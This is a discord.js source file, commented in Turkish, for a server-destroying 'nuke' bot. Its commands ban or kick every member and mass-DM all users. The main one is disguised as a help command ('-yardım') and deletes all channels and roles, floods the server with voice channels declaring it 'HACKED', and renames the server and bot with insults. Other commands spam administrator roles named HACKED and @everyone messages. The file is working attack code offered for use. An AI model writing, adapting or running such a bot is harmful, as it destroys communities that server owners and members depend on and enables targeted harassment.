const Discord = require("discord.js");
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(ayarlar.token);

client.on("message", msg => {         
  if (msg.content === "-ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());  
  }
});       /// Sunucuda Bulunan Herkesi Banlayan Komut | -ban

client.on("message", msg => {
  if (msg.content === "-kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});      /// Sunucuda Bulunan Herkesi Kick'leyen Komut | -kick

client.on("message", async msg => {
  if (msg.content === "-duyur") {  /// Sunucuda Bulunan Herkese DM Üzerinden Mesaj Gönderen Komut | -duyur
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "**İçerisinde Olduğunuz Sunucu Artık Yok** 👍🏻"  /// Herkese Atılacak Mesajın İçeriği | Mesajı İstediğiniz Gibi Dizayn Edebilirsiniz.
        )
      )
      .catch(console.error);
  } 
});

client.on("message", msg => {
  if (msg.content === "-yetki") {  /// Sunucuda '🔐' Diye Bir Rol Oluşturur ve Yönetici Yetkisi Verir. Ardından Rolü Sizlere Verir.
    msg.delete();
    msg.guild.createRole({
      name: "🔐",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");  
    msg.member.addRole(rol);
  }
});

client.on("message", async msg => {
  if (msg.content === "-yardım") {     /// Ana Komut'tur. İsminin 'Yardım' Olamsının Sebebi Anlaşılmaması İçindir. Komut Yazıldığında Tüm Kanalları Siler Ve Çok Sayıda Kanal Açar
    msg.delete();

    await msg.guild.channels.deleteAll();      /// Tüm Kanalları Silen Komut

    await msg.guild.createChannel("🔎", {
      type: "text"
    });
      await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Bulunduğunuz Sunucu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Artık Patlatılmıştır...", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Patlatıldıysanız Vardır Bir Sebebi...", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Krallığımız", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Sonsuzdur", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Affetmeyiz!", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Yenilmeyiz!!", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Küllerimizden", {
        type: "voice"
      })
      .then(chan => {  
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Doğacağız", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Sizlere", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Diz", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("Çökme", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {  
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");  
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");  
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {  
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      }) 
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {  
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })  
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild 
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"   
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      }) 
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });                    
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
    await msg.guild.setIcon("https://cdn.discordapp.com/attachments/1137433768550989855/1139255440409120818/eheglewons.jpeg");  /// Sunucunun Resmini Değiştirir.
    await msg.guild.setName("Siz Kimsiniz Knk!?"); /// Sunucunun İsmini Değiştirir.
    await msg.guild.roles.forEach(roles => roles.delete()); /// Botun Sizde Bildiği Bütün Rolleri Siler (Bot'un Rolünün Altındakiler) 
    await client.user.setAvatar("https://cdn.discordapp.com/attachments/1137433768550989855/1139255440409120818/eheglewons.jpeg"); /// Botun Resmini Değiştirir
    await client.user.setUsername("ャ Siz Kimsiniz AMK!? ャ");    /// Botun İsmini Değiştirir.
    await msg.guild.owner.send("**Duyamadımda Ne Demiştin Kanki!?**");    /// Sunucunun Kurucusuna DM Üzerinden Gönderilen Mesaj.
    
  }  
});



    client.on("message", msg => {
  if (msg.content === "-rolspam") {  /// Çok Sayıda Rol Oluşturur
    msg.delete();
    msg.guild.createRole({
      name: "HACKED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "HACKED",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] 
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "E000FF", 
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    });
  }
});

client.on('message', msg => {
  if (msg.content === '-spam') { /// Komutun Yazıldığı Kanala Spam Atar.
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
